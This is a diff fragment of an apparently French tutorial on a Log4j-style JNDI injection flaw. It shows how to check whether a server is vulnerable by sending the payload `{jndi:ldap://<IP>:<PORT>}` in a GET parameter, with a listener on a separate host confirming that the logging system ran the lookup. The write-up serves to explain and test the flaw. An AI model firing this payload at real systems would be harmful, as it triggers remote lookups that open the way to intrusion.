@@ -35,3 +35,9 @@ Ici, on voit clairement que les requêtes GET sont journalisées, l'url mais ég
 Pour identifier la vulnérabilité du système, il suffit d'injecter un paramètres GET avec la charge utile suivante (expliquée dans la présentation de la faille) :
 
 `{jndi:ldap://<IP>:<PORT>}`
+
+Voilà donc l'injection, avec un listener de l'autre côté pour vérifier la bonne execution par le système de logs :
+
+![5](https://user-images.githubusercontent.com/16634117/145870531-750a9523-9d1c-4b0d-b523-af4b2d1e669e.png)
+
+
